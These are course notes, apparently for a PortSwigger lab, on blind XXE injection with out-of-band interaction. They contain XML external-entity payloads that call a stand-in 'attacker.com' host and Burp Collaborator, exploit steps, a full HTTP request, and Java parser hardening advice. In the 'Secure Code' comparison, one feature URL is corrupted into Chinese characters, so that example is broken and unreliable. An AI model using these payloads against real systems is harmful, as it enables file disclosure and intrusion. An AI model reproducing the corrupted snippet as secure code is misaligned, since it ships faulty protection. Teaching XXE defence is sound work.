---
course: Web Security
topic: XXE Injection
tags: [web-security]
---

## Blind XXE Injection with Out-of-Band Interaction

### What is Blind XXE?

Blind XXE injection is a variant of XXE where the attacker does not receive direct feedback from the server. Instead, the attacker relies on indirect methods to confirm whether the attack was successful. This makes the attack more challenging to detect and mitigate.

### Out-of-Band Interaction

Out-of-band interaction refers to the use of external systems to confirm the success of an attack. In the context of XXE, this often involves using DNS or HTTP requests to verify that the server has processed the malicious XML input.

### Example Scenario

Consider the following scenario where an application processes XML input:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "http://attacker.com/payload" >]>
<foo>&xxe;</foo>
```

If the server processes this XML and makes an HTTP request to `http://attacker.com/payload`, the attacker can confirm that the XXE attack was successful.

### Lab Exercise: Blind XXE with Out-of-Band Interaction

#### Setup

The lab environment consists of an application that processes XML input. The application is configured to block requests from any server other than Burp Collaborator.

#### Steps to Exploit

1. **Identify Vulnerable Input**:
   Identify the input field where the application processes XML data. This could be a form field, API endpoint, or any other input mechanism.

2. **Craft Malicious XML**:
   Craft an XML payload that includes an external entity reference. For example:

   ```xml
   <?xml version="1.0"?>
   <!DOCTYPE foo [
     <!ELEMENT foo ANY >
     <!ENTITY xxe SYSTEM "http://burpcollaborator.net/payload" >]>
   <foo>&xxe;</foo>
   ```

3. **Submit Payload**:
   Submit the crafted XML payload to the application. If the application processes the XML and makes an HTTP request to the specified URL, the attack is successful.

4. **Verify Success**:
   Use Burp Collaborator to verify that the server made the HTTP request. This confirms that the XXE attack was successful.

#### Full HTTP Request and Response

Here is a complete example of the HTTP request and response:

```http
POST /process_xml HTTP/1.1
Host: vulnerableapp.com
Content-Type: application/xml
Content-Length: 150

<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "http://burpcollaborator.net/payload" >]>
<foo>&xxe;</foo>
```

Response:

```http
HTTP/1.1 200 OK
Date: Mon, 20 Mar 2023 12:00:00 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Length: 0
Connection: close
Content-Type: text/html; charset=UTF-8
```

#### Explanation of Headers

- **Content-Type**: Specifies the media type of the resource. Here, it is set to `application/xml`.
- **Content-Length**: Indicates the size of the body in bytes.
- **Date**: The date and time the response was generated.
- **Server**: Identifies the server software.
- **Connection**: Indicates whether the connection should remain open after the current transaction.

### Detection and Prevention

#### How to Detect XXE

To detect XXE vulnerabilities, you can use automated tools like static analysis tools, dynamic analysis tools, and manual testing techniques. Some popular tools include:

- **OWASP ZAP**: A free and open-source web application security scanner.
- **Burp Suite**: A comprehensive platform for performing security testing of web applications.

#### How to Prevent XXE

To prevent XXE attacks, follow these best practices:

1. **Disable External Entity Processing**:
   Configure your XML parser to disable external entity processing. This can be done by setting the appropriate flags or configurations.

2. **Use Secure XML Libraries**:
   Use XML libraries that have built-in protections against XXE attacks. For example, in Java, you can use the `DocumentBuilderFactory` class and set the `setFeature` method to disable external entity expansion.

3. **Input Validation**:
   Validate all XML input to ensure it does not contain malicious entities. Use regular expressions or other validation techniques to filter out dangerous input.

4. **Secure Coding Practices**:
   Implement secure coding practices to avoid common pitfalls. For example, avoid using `eval()` functions and ensure that all user input is properly sanitized.

#### Secure Code Example

Here is an example of how to securely configure an XML parser in Java:

```java
DocumentBuilderFactory dbFactory = DocumentBuilderFactory.newInstance();
dbFactory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbFactory.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbFactory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbFactory.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);

DocumentBuilder dBuilder = dbFactory.newDocumentBuilder();
Document doc = dBuilder.parse(new InputSource(new StringReader(xmlString)));
```

#### Vulnerable vs. Secure Code

Here is a comparison of vulnerable and secure code:

**Vulnerable Code**:

```java
DocumentBuilderFactory dbFactory = DocumentBuilderFactory.newInstance();
DocumentBuilder dBuilder = dbFactory.newDocumentBuilder();
Document doc = dBuilder.parse(new InputSource(new StringReader(xmlString)));
```

**Secure Code**:

```java
DocumentBuilderFactory dbFactory = DocumentBuilderFactory.newInstance();
dbFactory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbFactory.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbFactory.setFeature("http://xml.org/sax/features/外部参数实体", false);
dbFactory.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);

DocumentBuilder dBuilder = dbFactory.newDocumentBuilder();
Document doc = dBuilder.parse(new InputSource(new StringReader(xmlString)));
```

### Hands-On Practice

For hands-on practice with XXE injection, consider the following labs:

- **PortSwigger Web Security Academy**: Offers interactive labs on XXE injection.
- **OWASP Juice Shop**: Provides a vulnerable web application for practicing various security attacks, including XXE.
- **DVWA (Damn Vulnerable Web Application)**: A PHP/MySQL web application that is deliberately vulnerable for security testing purposes.

These labs provide a controlled environment to practice and understand XXE injection in depth.

### Conclusion

Understanding and preventing XXE injection is crucial for securing applications that process XML data. By disabling external entity processing, using secure XML libraries, validating input, and implementing secure coding practices, you can significantly reduce the risk of XXE attacks. Regularly testing and auditing your applications can help identify and mitigate potential vulnerabilities.

By mastering the concepts and techniques discussed in this chapter, you will be well-equipped to handle XXE injection attacks and ensure the security of your applications.

---
<!-- nav -->
[[Web Security (PortSwigger)/08-XXE Injection/05-Lab 4 Blind XXE with out of band interaction via XML parameter entities/01-Introduction to XXE Injection|Introduction to XXE Injection]] | [[Web Security (PortSwigger)/08-XXE Injection/05-Lab 4 Blind XXE with out of band interaction via XML parameter entities/00-Overview|Overview]] | [[03-Blind XXE with Out-of-Band Interaction via XML Parameter Entities|Blind XXE with Out-of-Band Interaction via XML Parameter Entities]]
